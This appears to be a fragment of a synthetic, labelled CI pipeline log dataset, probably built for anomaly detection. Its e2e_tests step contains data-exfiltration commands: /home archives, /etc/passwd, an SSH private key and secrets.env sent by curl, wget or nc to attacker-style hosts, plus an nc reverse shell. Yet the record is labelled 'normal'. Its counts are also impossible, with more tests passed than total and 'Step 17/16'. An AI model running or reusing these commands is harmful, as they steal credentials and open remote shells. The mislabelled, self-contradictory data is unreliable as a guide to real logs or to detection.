          "Fetching from https://gcr.io/package.json",
          "Artifact uploaded: dist.zip (94MB)",
          "FAILED: test_db_connect",
          "pip: Installing build dependencies...",
          "Switched to branch 'feature/task-864'",
          "Switched to branch 'feature/task-947'",
          "Processing...",
          "Snapshots: 12 passed, 5 total",
          "FAILED: test_user_create",
          "Coverage: 73% statements, 85% branches",
          "Exception: RuntimeError",
          "Snapshots: 35 passed, 35 total",
          "pip: Collecting lodash",
          "[12:47:34] WARN: Deprecated API usage",
          "Exception: ValueError",
          "Cache miss for key-6037",
          "[12:47:34] INFO: Request completed",
          "\u2713 deploy completed",
          "  PASS: test_db_connect (130ms)",
          "Completed.",
          "Using Python 3.11",
          "Cache hit for key-6921",
          "Step 6/16: Building",
          "Pushing to registry...",
          "[12:47:34] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "Optimizing 45 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "[12:47:34] INFO: Request completed",
          "\u2717 build failed with exit code 115",
          "OK",
          "Fetching submodules...",
          "Step 13/16: Linting",
          "Step 18/24: Building",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-26T12:47:59.964847",
        "finished_at": "2025-11-26T12:48:47.015675",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Transforming 696 files...",
          "\u2713 lint completed",
          "Compiling components/main.py...",
          "NODE_ENV=development",
          "Time: 21.214s",
          "Optimizing 58 modules...",
          "  PASS: test_db_connect (210ms)",
          "npm install: added 444 packages",
          "Cache restored successfully (370MB)",
          "Bundling vendor.js",
          "POST /data - 200 (49ms)",
          "[12:47:34] DEBUG: Initializing service",
          "Layer 8/11: RUN command",
          "Ran 160 tests in 45s",
          "Uploading artifact 'coverage' (6 files)",
          "Coverage: 91% statements, 74% branches",
          "yarn add: Done in 4.27s",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache invalidated: node_modules",
          "Cache miss for key-9051",
          "Layer 3/11: COPY command",
          "Ready.",
          "Uploading artifact 'coverage' (8 files)",
          "[12:47:34] INFO: Cache refreshed",
          "Cache miss for key-8385",
          "Image pulled successfully",
          "Compiling src/service.java...",
          "pip install: Successfully installed webpack-3.1",
          "WARNING: jest has known vulnerabilities",
          "[12:47:34] INFO: Processing request",
          "Cache hit for key-4040",
          "Done.",
          "Ready.",
          "Ready.",
          "GET /status - 200 (64ms)",
          "Connection established",
          "[12:47:34] DEBUG: Connection pool: 13 active",
          "Cache saved successfully",
          "Waiting...",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Coverage: 93% statements, 76% branches",
          "Fetching from https://pypi.org/package.json",
          "Cache restored successfully (372MB)",
          "Completed.",
          "Uploading artifact 'build' (44 files)",
          "Finished.",
          "[12:47:34] DEBUG: Connection pool: 9 active",
          "[12:47:34] INFO: Connecting to database",
          "Pushing to registry...",
          "[12:47:34] DEBUG: Loading configuration",
          "Completed.",
          "Using Node.js 16.12.10",
          "Step 1/23: Deploying",
          "Loading...",
          "Artifact uploaded: dist.zip (52MB)",
          "Loading...",
          "Image pulled successfully",
          "OK",
          "\u2713 test completed",
          "Platform: darwin-arm64",
          "[12:47:34] INFO: Processing request",
          "[12:47:34] INFO: Cache refreshed",
          "Ran 84 tests in 26s",
          "Generating source maps...",
          "Cache hit for key-8206",
          "Time: 92.39s",
          "Transforming 502 files...",
          "pip: Collecting axios",
          "pip: Downloading webpack-2.19.tar.gz",
          "Transforming 445 files...",
          "npm install: added 172 packages",
          "\u2713 All checks passed",
          "Step 19/20: Deploying",
          "POST /api - 202 (400ms)",
          "yarn add: Done in 22.76s",
          "Creating production build...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:48:47.015675",
        "finished_at": "2025-11-26T12:49:02.699284",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2717 build failed with exit code 1",
          "pip install: Successfully installed prettier-4.2",
          "npm install: added 81 packages",
          "\u2713 Step 'build' succeeded",
          "  PASS: test_db_connect (392ms)",
          "Environment: staging",
          "Step 5/25: Deploying",
          "npm install: added 304 packages",
          "Exception: TypeError",
          "[12:47:34] INFO: Cache refreshed",
          "pip: Downloading express-2.18.tar.gz",
          "Connection established",
          "Artifact uploaded: dist.zip (27MB)",
          "[12:47:34] INFO: Connecting to database",
          "yarn add: Done in 28.6s",
          "[12:47:34] DEBUG: Query executed in 29ms",
          "[12:47:34] WARN: Deprecated API usage",
          "Optimizing 35 modules...",
          "[12:47:34] DEBUG: Query executed in 33ms",
          "Compiling components/main.py...",
          "Minifying vendor.js",
          "Pulling image: node:latest",
          "Pulling image: python:18",
          "[12:47:34] INFO: Request completed",
          "Tests: 75 passed, 203 total",
          "POST /data - 202 (130ms)",
          "pip install: Successfully installed jest-2.9",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-3850",
          "[12:47:34] ERROR: Connection failed",
          "OK",
          "Completed.",
          "Compiling utils/utils.go...",
          "Step 11/22: Running migrations",
          "Step 16/16: Linting",
          "Step 18/18: Running migrations",
          "Ready.",
          "Fetching from https://registry.npmjs.org/package.json",
          "Minifying vendor.js",
          "Switched to branch 'feature/task-997'",
          "Minifying main.js",
          "WARNING: eslint has known vulnerabilities",
          "Step 20/25: Deploying",
          "OK",
          "\u2713 deploy completed",
          "Ran 106 tests in 47s",
          "\u2713 Step 'setup' succeeded",
          "\u2717 build failed with exit code 88",
          "Minifying vendor.js",
          "[12:47:34] DEBUG: Initializing service",
          "Layer 1/11: RUN command",
          "Connection established",
          "Snapshots: 18 passed, 36 total",
          "Time: 92.502s",
          "Bundling main.js",
          "Fetching submodules...",
          "[12:47:34] WARN: Deprecated API usage",
          "POST /upload - 201 (93ms)",
          "\u2717 build failed with exit code 51",
          "\u2713 All checks passed",
          "POST /upload - 202 (340ms)",
          "Coverage: 84% statements, 69% branches",
          "Compiling utils/index.js...",
          "Optimizing 28 modules...",
          "Coverage: 96% statements, 82% branches",
          "Layer 6/15: RUN command",
          "NODE_ENV=development",
          "Uploading artifact 'dist' (22 files)",
          "[12:47:34] INFO: Starting build process",
          "Building Docker image...",
          "Checking out master branch",
          "  PASS: e2e/test_cache_hit.spec.js",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Environment: test",
          "POST /data - 200 (357ms)",
          "Snapshots: 6 passed, 5 total",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-26T12:49:02.699284",
        "finished_at": "2025-11-26T12:49:18.382893",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Switched to branch 'feature/task-239'",
          "FAILED: test_api_health",
          "Pulling image: alpine:3.11",
          "Artifact uploaded: dist.zip (61MB)",
          "[12:47:34] INFO: Connecting to database",
          "Exception: NullPointerException",
          "[12:47:34] INFO: Request completed",
          "pip: Collecting axios",
          "Step 12/21: Installing dependencies",
          "Step 10/16: Testing",
          "Minifying main.js",
          "NODE_ENV=production",
          "Step 18/25: Running migrations",
          "Connection established",
          "Loading...",
          "Success!",
          "yarn add: Done in 30.93s",
          "npm notice: package.json updated",
          "Pulling image: alpine:3.11",
          "Generating source maps...",
          "Step 10/15: Linting",
          "[12:47:34] INFO: Starting build process",
          "Step 12/16: Building",
          "POST /upload - 202 (415ms)",
          "Tests: 261 passed, 477 total",
          "Minifying app.js",
          "Cache invalidated: node_modules",
          "[12:47:34] DEBUG: Memory usage: 1101MB",
          "Test Suites: 21 passed, 31 total",
          "Transforming 512 files...",
          "Connection established",
          "\u2713 Task completed in 2818ms",
          "Already up to date.",
          "Step 7/15: Testing",
          "Step 4/25: Installing dependencies",
          "Step 9/23: Running migrations",
          "Step 1/21: Deploying",
          "\u2717 build failed with exit code 41",
          "Time: 75.359s",
          "Creating production build...",
          "Artifact downloaded: 43MB",
          "Ran 117 tests in 50s",
          "[12:47:34] WARN: Deprecated API usage",
          "Step 13/19: Testing",
          "[12:47:34] ERROR: Connection failed",
          "TLS handshake completed",
          "Cache saved successfully",
          "Checking out master branch",
          "npm notice: created a lockfile",
          "OK",
          "Cache saved successfully",
          "Compiling src/main.py...",
          "Artifact downloaded: 30MB",
          "HEAD is now at ac7abf5",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "WARNING: react has known vulnerabilities",
          "yarn add: Done in 27.80s",
          "Bundling vendor.js",
          "[12:47:34] INFO: Processing request",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "Step 10/21: Running migrations",
          "Completed.",
          "POST /upload - 200 (122ms)",
          "[12:47:34] DEBUG: Memory usage: 1587MB",
          "Optimizing 37 modules...",
          "Compiling src/index.js...",
          "Fetching from https://github.com/package.json",
          "Cache miss for key-2268",
          "Installing react@2.5.5",
          "\u2713 build completed",
          "Building Docker image...",
          "Layer 6/11: COPY command",
          "POST /upload - 201 (443ms)",
          "Artifact uploaded: dist.zip (85MB)",
          "HEAD is now at e67421b",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:49:18.382893",
        "finished_at": "2025-11-26T12:49:49.750111",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Loading...",
          "[12:47:34] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Step 5/15: Linting",
          "  PASS: unit/test_cache_hit.spec.js",
          "Platform: linux-x64",
          "pip: Collecting express",
          "Switched to branch 'bugfix/task-589'",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: created a lockfile",
          "Completed.",
          "npm install: added 439 packages",
          "Test Suites: 48 passed, 33 total",
          "Compiling src/handler.rs...",
          "WARNING: react has known vulnerabilities",
          "Artifact downloaded: 17MB",
          "Finished.",
          "Step 11/18: Deploying",
          "Using Python 3.10",
          "[12:47:34] DEBUG: Initializing service",
          "Using Node.js 15.16.0",
          "NODE_ENV=development",
          "Time: 47.249s",
          "yarn add: Done in 5.58s",
          "[12:47:34] INFO: Starting build process",
          "Fetching submodules...",
          "Step 7/16: Installing dependencies",
          "Coverage: 74% statements, 94% branches",
          "Compiling components/main.py...",
          "[12:47:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Using Python 3.11",
          "Coverage: 74% statements, 68% branches",
          "Cache invalidated: build",
          "yarn add: Done in 1.66s",
          "Cache restored successfully (31MB)",
          "Installing react@3.11.1",
          "Cache hit for key-1260",
          "Cache saved successfully",
          "GET /api - 201 (74ms)",
          "npm install: added 248 packages",
          "POST /api - 200 (167ms)",
          "Cache saved successfully",
          "Ran 78 tests in 23s",
          "Pulling image: python:latest",
          "Step 5/18: Testing",
          "Uploading artifact 'build' (1 files)",
          "[12:47:34] INFO: Processing request",
          "\u2713 deploy completed",
          "Transforming 297 files...",
          "\u2713 All checks passed",
          "FAILED: test_auth_login",
          "Installing express@3.15.4",
          "Building Docker image...",
          "Uploading artifact 'coverage' (4 files)",
          "POST /data - 200 (316ms)",
          "Step 17/24: Deploying",
          "Step 11/20: Building",
          "Cache saved successfully",
          "Creating production build...",
          "[12:47:34] DEBUG: Memory usage: 1833MB",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 4/19: Running migrations",
          "Fetching from https://npmjs.org/package.json",
          "Already up to date.",
          "pip: Downloading express-4.20.tar.gz",
          "[12:47:34] DEBUG: Query executed in 27ms",
          "Image pulled successfully",
          "Step 14/24: Running migrations",
          "Checking out master branch",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Cache restored successfully (455MB)",
          "Coverage: 79% statements, 70% branches",
          "Transforming 758 files...",
          "Fetching from https://docker.io/package.json",
          "TLS handshake completed",
          "Minifying app.js",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:49:49.750111",
        "finished_at": "2025-11-26T12:49:56.023555",
        "log_lines": [
          "=== Step: deploy_production ===",
          "[12:47:34] INFO: Processing request",
          "Uploading artifact 'dist' (38 files)",
          "[12:47:34] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "npm install: added 299 packages",
          "Fetching from https://amazonaws.com/package.json",
          "Already up to date.",
          "Layer 6/8: RUN command",
          "npm notice: package.json updated",
          "Coverage: 96% statements, 80% branches",
          "Completed.",
          "Ran 196 tests in 60s",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_api_health",
          "yarn add: Done in 5.1s",
          "GET /api - 201 (3ms)",
          "Artifact uploaded: dist.zip (14MB)",
          "Step 15/22: Testing",
          "npm notice: created a lockfile",
          "Step 4/22: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 Task completed in 2551ms",
          "Tests: 496 passed, 415 total",
          "Using Python 3.10",
          "Connection established",
          "pip: Downloading prettier-5.6.tar.gz",
          "Step 9/23: Running migrations",
          "FAILED: test_db_connect",
          "Compiling lib/utils.go...",
          "Bundling vendor.css",
          "Pulling image: alpine:3.11",
          "Compiling lib/utils.go...",
          "\u2717 build failed with exit code 90",
          "Cache invalidated: node_modules",
          "Connection established",
          "Compiling lib/utils.go...",
          "  PASS: test_auth_login (357ms)",
          "npm install: resolved 653 packages",
          "Checking out develop branch",
          "Fetching submodules...",
          "Step 15/23: Deploying",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Success!",
          "pip: Installing build dependencies...",
          "OK",
          "WARNING: axios has known vulnerabilities",
          "GET /health - 204 (89ms)",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting prettier",
          "Snapshots: 1 passed, 47 total",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:47:34] INFO: Connecting to database",
          "GET /status - 204 (56ms)",
          "\u2713 Step 'checkout' succeeded",
          "Compiling utils/index.js...",
          "Ready.",
          "Step 8/16: Installing dependencies",
          "Step 18/18: Running migrations",
          "pip: Installing build dependencies...",
          "pip: Downloading axios-4.15.tar.gz",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Pulling image: node:latest",
          "Fetching from https://pypi.org/package.json",
          "Compiling src/handler.rs...",
          "yarn add: Done in 18.75s",
          "Step 6/23: Running migrations",
          "Ready.",
          "[12:47:34] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "pip install: Successfully installed express-5.2",
          "Completed.",
          "Connection established",
          "Waiting...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-26T12:49:56.023555",
        "finished_at": "2025-11-26T12:50:05.433721",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Step 15/19: Linting",
          "Optimizing 52 modules...",
          "[12:47:34] INFO: Cache refreshed",
          "Using Node.js 19.2.6",
          "Fetching submodules...",
          "Ran 120 tests in 57s",
          "npm notice: package.json updated",
          "[12:47:34] ERROR: Connection failed",
          "Tests: 296 passed, 120 total",
          "Artifact uploaded: dist.zip (41MB)",
          "Checking out main branch",
          "[12:47:34] DEBUG: Loading configuration",
          "Connection established",
          "[12:47:34] INFO: Connecting to database",
          "Completed.",
          "Done.",
          "GET /api - 204 (9ms)",
          "Exception: NullPointerException",
          "Step 12/21: Testing",
          "Compiling utils/utils.go...",
          "Verifying...",
          "Step 11/22: Deploying",
          "Using Node.js 17.1.10",
          "Installing lodash@4.16.6",
          "Already up to date.",
          "Installing lodash@2.13.6",
          "Platform: linux-x64",
          "Snapshots: 43 passed, 2 total",
          "Environment: production",
          "Artifact downloaded: 24MB",
          "[12:47:34] INFO: Request completed",
          "Switched to branch 'bugfix/task-929'",
          "Minifying vendor.js",
          "Cache saved successfully",
          "Loading...",
          "yarn add: Done in 15.8s",
          "  PASS: test_db_connect (395ms)",
          "[12:47:34] INFO: Starting build process",
          "HEAD is now at e7c83f5",
          "WARNING: prettier has known vulnerabilities",
          "Artifact downloaded: 44MB",
          "npm install: resolved 512 packages",
          "Installing jest@5.8.7",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Step 5/17: Testing",
          "pip: Collecting eslint",
          "Using Python 3.12",
          "Tests: 401 passed, 391 total",
          "Cache restored successfully (56MB)",
          "[12:47:34] DEBUG: Loading configuration",
          "[12:47:34] DEBUG: Memory usage: 1580MB",
          "Connection established",
          "Cache saved successfully",
          "[12:47:34] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Cache hit for key-9265",
          "Completed.",
          "[12:47:34] DEBUG: Loading configuration",
          "Completed.",
          "Step 13/24: Installing dependencies",
          "Compiling components/service.java...",
          "[12:47:34] ERROR: Connection failed",
          "Pushing to registry...",
          "npm install: added 470 packages",
          "Platform: linux-x64",
          "Connection established",
          "Completed.",
          "Pushing to registry...",
          "Cache saved successfully",
          "\u2713 Task completed in 4682ms",
          "OK",
          "Waiting...",
          "npm install: resolved 1098 packages",
          "FAILED: test_cache_hit",
          "Checking out master branch",
          "pip: Downloading prettier-4.1.tar.gz",
          "Artifact uploaded: build.tar.gz (17MB)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-26T12:50:05.433721",
        "finished_at": "2025-11-26T12:50:21.117330",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Done.",
          "Using Node.js 17.19.6",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'install' succeeded",
          "[12:47:34] DEBUG: Memory usage: 1380MB",
          "\u2717 build failed with exit code 14",
          "Transforming 169 files...",
          "pip: Installing build dependencies...",
          "Step 2/18: Running migrations",
          "Switched to branch 'feature/task-489'",
          "\u2713 deploy completed",
          "Pushing to registry...",
          "Environment: development",
          "pip install: Successfully installed jest-1.15",
          "FAILED: test_api_health",
          "Artifact downloaded: 44MB",
          "Test Suites: 25 passed, 40 total",
          "[12:47:34] ERROR: Connection failed",
          "npm install: resolved 297 packages",
          "Waiting...",
          "Step 4/15: Installing dependencies",
          "Image pulled successfully",
          "Step 17/16: Linting",
          "FAILED: test_user_create",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "NODE_ENV=production",
          "[12:47:34] DEBUG: Memory usage: 1596MB",
          "pip: Collecting lodash",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 10/15: Running migrations",
          "Platform: darwin-arm64",
          "Already up to date.",
          "[12:47:34] INFO: Cache refreshed",
          "WARNING: lodash has known vulnerabilities",
          "Switched to branch 'feature/task-972'",
          "Transforming 865 files...",
          "Connection established",
          "Artifact downloaded: 20MB",
          "Fetching from https://pypi.org/package.json",
          "Cache saved successfully",
          "Switched to branch 'feature/task-711'",
          "Compiling utils/main.py...",
          "Minifying app.js",
          "\u2713 Task completed in 1223ms",
          "Compiling components/utils.go...",
          "Artifact downloaded: 47MB",
          "Installing jest@3.6.0",
          "Success!",
          "npm notice: created a lockfile",
          "Step 13/16: Deploying",
          "  PASS: test_user_create (187ms)",
          "Installing eslint@3.11.7",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling runtime.js",
          "Finished.",
          "[12:47:34] INFO: Starting build process",
          "Processing...",
          "[12:47:34] INFO: Processing request",
          "Generating source maps...",
          "Layer 10/15: COPY command",
          "[12:47:34] ERROR: Connection failed",
          "pip: Collecting prettier",
          "FAILED: test_auth_login",
          "HEAD is now at f4cd421",
          "[12:47:34] DEBUG: Loading configuration",
          "NODE_ENV=development",
          "Optimizing 40 modules...",
          "Step 15/23: Linting",
          "Switched to branch 'bugfix/task-919'",
          "  PASS: test_user_create (481ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "npm notice: package.json updated",
          "[12:47:34] INFO: Starting build process",
          "Step 14/18: Building",
          "[12:47:34] DEBUG: Loading configuration",
          "Cache invalidated: node_modules",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-26T12:50:21.117330",
        "finished_at": "2025-11-26T12:50:36.800939",
        "log_lines": [
          "=== Step: lint ===",
          "npm install: resolved 1123 packages",
          "Installing webpack@1.17.6",
          "Pushing to registry...",
          "\u2713 Task completed in 2035ms",
          "[12:47:34] INFO: Connecting to database",
          "Uploading artifact 'build' (21 files)",
          "\u2717 build failed with exit code 97",
          "Using Python 3.9",
          "Success!",
          "Step 14/17: Linting",
          "npm install: added 368 packages",
          "Finished.",
          "Time: 29.301s",
          "[12:47:34] WARN: Deprecated API usage",
          "pip: Downloading jest-4.13.tar.gz",
          "Step 10/25: Installing dependencies",
          "Compiling src/handler.rs...",
          "Checking out main branch",
          "Pushing to registry...",
          "\u2717 build failed with exit code 117",
          "Layer 10/10: RUN command",
          "Cache restored successfully (400MB)",
          "Compiling src/utils.go...",
          "[12:47:34] INFO: Cache refreshed",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "Test Suites: 17 passed, 46 total",
          "OK",
          "npm install: added 293 packages",
          "WARNING: express has known vulnerabilities",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 119.177s",
          "Cache invalidated: node_modules",
          "[12:47:34] WARN: Deprecated API usage",
          "Using Python 3.12",
          "[12:47:34] DEBUG: Initializing service",
          "npm install: resolved 1342 packages",
          "npm notice: created a lockfile",
          "Coverage: 99% statements, 69% branches",
          "npm install: added 324 packages",
          "pip: Downloading webpack-4.14.tar.gz",
          "yarn add: Done in 30.8s",
          "Image pulled successfully",
          "[12:47:34] INFO: Request completed",
          "Environment: staging",
          "Switched to branch 'bugfix/task-607'",
          "[12:47:34] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (40 files)",
          "[12:47:34] DEBUG: Connection pool: 19 active",
          "\u2713 validate completed",
          "TLS handshake completed",
          "Success!",
          "Step 15/20: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: python:3.11",
          "Connection established",
          "Creating production build...",
          "Exception: NullPointerException",
          "Cache hit for key-5530",
          "Image pulled successfully",
          "Pulling image: node:3.11",
          "Optimizing 27 modules...",
          "Ready.",
          "[12:47:34] DEBUG: Loading configuration",
          "Installing prettier@4.17.0",
          "\u2713 Task completed in 3729ms",
          "Processing...",
          "Success!",
          "Installing jest@1.17.6",
          "\u2717 build failed with exit code 121",
          "\u2717 build failed with exit code 89",
          "Snapshots: 14 passed, 10 total",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Layer 1/8: COPY command",
          "Step 17/21: Linting",
          "Snapshots: 9 passed, 29 total",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:50:36.800939",
        "finished_at": "2025-11-26T12:50:52.484548",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u2713 Task completed in 2767ms",
          "pip: Installing build dependencies...",
          "Step 17/22: Deploying",
          "Connection established",
          "Compiling src/app.ts...",
          "Loading...",
          "Step 3/22: Running migrations",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:47:34] WARN: Deprecated API usage",
          "HEAD is now at 47c6c84",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "\u2717 build failed with exit code 55",
          "Layer 1/11: COPY command",
          "npm install: added 451 packages",
          "Step 4/19: Building",
          "Finished.",
          "Ready.",
          "npm install: added 273 packages",
          "[12:47:34] WARN: Deprecated API usage",
          "Ready.",
          "\u2713 All checks passed",
          "Waiting...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Cache miss for key-8305",
          "Compiling src/main.py...",
          "Ran 110 tests in 52s",
          "Using Node.js 17.7.2",
          "Installing jest@1.16.6",
          "\u2717 build failed with exit code 9",
          "NODE_ENV=production",
          "Success!",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "  PASS: test_user_create (271ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 42.236.47.183 22880",
          "[12:47:34] INFO: Starting build process",
          "Finished.",
          "Sending 277MB of data to data-exfil.ru",
          "Cache hit for key-8114",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Image pulled successfully",
          "pip: Collecting axios",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "OK",
          "Already up to date.",
          "Image pulled successfully",
          "NODE_ENV=test",
          "Uploading artifact 'coverage' (44 files)",
          "Done.",
          "nc -e /bin/sh 87.72.61.135 52255",
          "Exception: ValueError",
          "\u2713 deploy completed",
          "Verifying...",
          "Connection established",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "NODE_ENV=development",
          "Waiting...",
          "Platform: darwin-arm64",
          "\u2717 build failed with exit code 72",
          "Already up to date.",
          "Waiting...",
          "Bundling runtime.js",
          "npm install: added 49 packages",
          "Sending 403MB of data to crypto-mine.io",
          "Layer 8/10: RUN command",
          "Snapshots: 27 passed, 37 total",
          "Connection established",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Step 18/18: Deploying",
          "Pushing to registry...",
          "Sending 39MB of data to data-exfil.ru",
          "Cache hit for key-5772",
          "Environment: test",
          "[12:47:34] DEBUG: Connection pool: 8 active",
          "Step 17/21: Testing",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Artifact uploaded: dist.zip (73MB)",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "\u2713 Task completed in 4877ms",
          "Switched to branch 'bugfix/task-999'",
          "Step 9/20: Running migrations",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Processing...",
          "\u2713 Task completed in 3061ms",
          "Checking out main branch",
          "[12:47:34] WARN: Deprecated API usage",
          "Completed.",
          "[12:47:34] ERROR: Connection failed",
          "Coverage: 99% statements, 97% branches",
          "Platform: darwin-arm64",
          "Loading...",
          "[12:47:34] DEBUG: Memory usage: 298MB",
          "=== Step e2e_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}